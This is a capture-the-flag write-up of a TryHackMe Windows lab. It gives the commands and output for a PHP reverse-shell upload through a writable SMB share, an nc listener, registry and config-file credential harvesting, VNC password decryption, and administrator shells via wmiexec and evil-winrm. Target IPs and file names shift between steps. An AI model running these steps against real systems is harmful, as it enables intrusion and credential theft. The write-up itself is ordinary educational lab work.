# AllSigns2Point-Pawnage — TryHackMe Writeup

A walkthrough of **AllSigns2Point-Pawnage**, a medium-difficulty Windows machine on TryHackMe. The box chains anonymous FTP reconnaissance, SMB file upload for remote code execution, exposure of deployment secrets in an install script, Windows Registry credential disclosure, VNC password decryption, and the use of harvested domain administrator credentials for full remote command execution.

---

## Table of Contents

- [Machine Information](#machine-information)
- [Reconnaissance](#reconnaissance)
  - [Full Port Scan](#full-port-scan)
  - [Service and Version Detection](#service-and-version-detection)
- [Enumeration](#enumeration)
  - [Anonymous FTP Access](#anonymous-ftp-access)
  - [SMB Share Enumeration](#smb-share-enumeration)
- [Initial Foothold](#initial-foothold)
  - [Web Shell Upload via SMB](#web-shell-upload-via-smb)
  - [Reverse Shell Catch](#reverse-shell-catch)
- [Privilege Escalation and Lateral Movement](#privilege-escalation-and-lateral-movement)
  - [Discovering the Install Script](#discovering-the-install-script)
  - [Remote Execution with Harvested Credentials](#remote-execution-with-harvested-credentials)
  - [Recovering the Sign User's Password](#recovering-the-sign-users-password)
  - [Decrypting the VNC Password](#decrypting-the-vnc-password)
  - [User Flag](#user-flag)
- [Administrator Access](#administrator-access)
- [Summary](#summary)

---

## Machine Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| OS | Windows |
| Target IP | `10.49.149.110` |

---

## Reconnaissance

### Full Port Scan

An initial all-port Nmap scan was run against the target to identify open services.

```text
Nmap scan report for ip-10-49-149-110.ap-south-1.compute.internal (10.49.149.110)
Host is up, received timestamp-reply ttl 128 (0.00023s latency).
Scanned at 2026-11-21 03:56:00 UTC for 71s
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       REASON
21/tcp    open  ftp           syn-ack ttl 128
80/tcp    open  http          syn-ack ttl 128
135/tcp   open  msrpc         syn-ack ttl 128
139/tcp   open  netbios-ssn   syn-ack ttl 128
443/tcp   open  https         syn-ack ttl 128
445/tcp   open  microsoft-ds  syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5900/tcp  open  vnc           syn-ack ttl 128
49664/tcp open  unknown       syn-ack ttl 128
49665/tcp open  unknown       syn-ack ttl 128
49666/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49668/tcp open  unknown       syn-ack ttl 128
49671/tcp open  unknown       syn-ack ttl 128
49680/tcp open  unknown       syn-ack ttl 128
```

### Service and Version Detection

A follow-up scan with service and version detection was run to fingerprint each open port.

```text
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 126 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_11-14-20  03:26PM                  173 notice.txt
80/tcp    open  http          syn-ack ttl 126 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
|_http-title: Simple Slide Show
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 126 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: DESKTOP-997GG7D
|   NetBIOS_Domain_Name: DESKTOP-997GG7D
|   NetBIOS_Computer_Name: DESKTOP-997GG7D
|   DNS_Domain_Name: DESKTOP-997GG7D
|   DNS_Computer_Name: DESKTOP-997GG7D
|   Product_Version: 10.0.18362
|_  System_Time: 2026-11-21T04:13:00+00:00
5900/tcp  open  vnc           syn-ack ttl 126 VNC (protocol 3.8)
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     Ultra (17)
|_    VNC Authentication (2)
49664-49680/tcp open msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

Key findings:

- **FTP** — Microsoft ftpd with **anonymous login allowed**.
- **HTTP/HTTPS** — Apache 2.4.46 on Windows (XAMPP stack) running PHP 7.4.11, serving a "Simple Slide Show" application.
- **SMB** — open with message signing enabled but not required.
- **RDP** — Terminal Services exposed, hostname `DESKTOP-997GG7D`.
- **VNC** — protocol 3.8 with both VNC Authentication and "Ultra" security types supported.

---

## Enumeration

### Anonymous FTP Access

Anonymous FTP login was available and used to retrieve a notice file left on the server.

```text
ftp> get notice.txt
local: notice.txt remote: notice.txt
```

```text
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to
a hidden windows file share for upload and management
of images.

- Dev Team
```

This indicated that image management had been moved from FTP to an SMB share, directing further enumeration toward SMB.

### SMB Share Enumeration

`enum4linux` was run against the target first, though it returned no actionable user or share detail beyond basic target information.

```bash
enum4linux -A 10.49.149.110
```

SMB shares were then listed directly:

```bash
smbclient -L 10.49.149.110 -N
```

```text
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk
	Installs$       Disk
	IPC$            IPC       Remote IPC
	Users           Disk
SMB1 disabled -- no workgroup available
```

The `images$` share, referenced in the FTP notice, stood out as a writable location reachable without credentials.

---

## Initial Foothold

### Web Shell Upload via SMB

An initial attempt to upload a PHP web shell directly via FTP was unsuccessful. However, the `images$` SMB share was found to be writable and mapped to the web application's image directory.

```bash
smbclient //10.49.149.110/images$ -N
```

```text
smb: \> ls
  .                                   D        0  Tue Jan 26 18:19:19 2021
  ..                                  D        0  Tue Jan 26 18:19:19 2021
  internet-1028794_1920.jpg           A   134193  Sun Jan 10 21:52:24 2021
  man-1459246_1280.png                A   363259  Sun Jan 10 21:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 21:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 21:53:59 2021

                10861311 blocks of size 4096. 4834623 blocks available
smb: \> put php.php
```

A PHP reverse shell was uploaded to the share, which corresponded directly to the web server's `images` directory, making it reachable over HTTP.

### Reverse Shell Catch

A listener was started locally, and the uploaded shell was triggered by requesting it over HTTP.

```bash
nc -lvnp 5555
```

```bash
curl http://10.49.152.98/images/rev.php
```

```text
listening on [any] 5555 ...
connect to [192.168.136.156] from (UNKNOWN) [10.49.152.98] 49779
```

A directory listing of `C:\` from the resulting shell revealed additional directories of interest:

```text
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\

24/11/2026  03:07    <DIR>          badr
14/11/2020  15:29    <DIR>          inetpub
14/11/2020  15:37    <DIR>          Installs
```

---

## Privilege Escalation and Lateral Movement

### Discovering the Install Script

The `Installs` directory contained a deployment batch script used to provision the application stack. Reading it revealed hardcoded administrator credentials used for the original installation.

```bash
type C:\Installs\Install_www_and_deploy.bat
```

```bat
@echo off
REM Shop Sign Install Script
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

This disclosed a plaintext **administrator** password, as well as confirmation that UltraVNC was deployed with a configuration file worth investigating further.

### Remote Execution with Harvested Credentials

The leaked administrator credentials were used with Impacket's `wmiexec` to obtain a proper, stable remote shell on the host.

```bash
impacket-wmiexec Administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.49.173.6
```

### Recovering the Sign User's Password

As part of the room's stated objectives, the password for the `sign` user also needed to be recovered. This was located by querying the Windows Registry for an auto-logon default password.

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
```

### Decrypting the VNC Password

The UltraVNC configuration file referenced in the install script was located and read, revealing encrypted VNC passwords.

```bash
cd Installs
type ultravnc.ini
```

```ini
[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=5AB2CDC0BADCAF13F1
[admin]
```

UltraVNC encrypts stored passwords using a fixed, publicly known DES key. A VNC password decryptor was used to recover the plaintext value, yielding the credential `5upp0rt9`.

### User Flag

With shell access established, the user flag was retrieved from the `sign` user's desktop.

```text
C:\Users\sign\Desktop>type user_flag.txt
```

---

## Administrator Access

With the administrator credentials recovered from the install script, `evil-winrm` was used to establish an authenticated WinRM session as the domain/local Administrator account.

```bash
evil-winrm -i 10.49.173.6 -u Administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi
```

From this session, the administrator flag was retrieved directly:

```text
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\Administrator\Desktop

14/11/2020  14:32    <DIR>          .
14/11/2020  14:32    <DIR>          ..
14/11/2020  14:31                54 admin_flag.txt
               1 File(s)             54 bytes
               2 Dir(s)  19,834,949,632 bytes free

C:\Users\Administrator\Desktop>type admin_flag.txt
```

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full port scan and service/version detection |
| Enumeration | Anonymous FTP notice file, SMB share listing |
| Foothold | Web shell upload via writable SMB share mapped to the web root |
| Privilege Escalation | Hardcoded credentials in a deployment batch script, Registry-stored default password, UltraVNC password decryption |
| Lateral Movement | `impacket-wmiexec` and `evil-winrm` with harvested Administrator credentials |

**Attack chain overview:**

1. Anonymous FTP exposed a notice redirecting image uploads to an SMB share.
2. The `images$` SMB share was writable and mapped to the live web application's image directory.
3. A PHP reverse shell was uploaded via SMB and triggered over HTTP, producing initial code execution.
4. A deployment batch script in `C:\Installs` disclosed a plaintext Administrator password used during provisioning.
5. The Windows Registry revealed a stored default password for the `sign` user.
6. An UltraVNC configuration file exposed DES-encrypted VNC passwords, decrypted to recover a further credential.
7. The disclosed Administrator credentials were used with `impacket-wmiexec` and `evil-winrm` to obtain full administrative remote command execution and retrieve both flags.

---

*This writeup documents a deliberately vulnerable machine created for educational purposes on TryHackMe. Techniques described apply only to this lab environment.*

# Jai Shri Ram
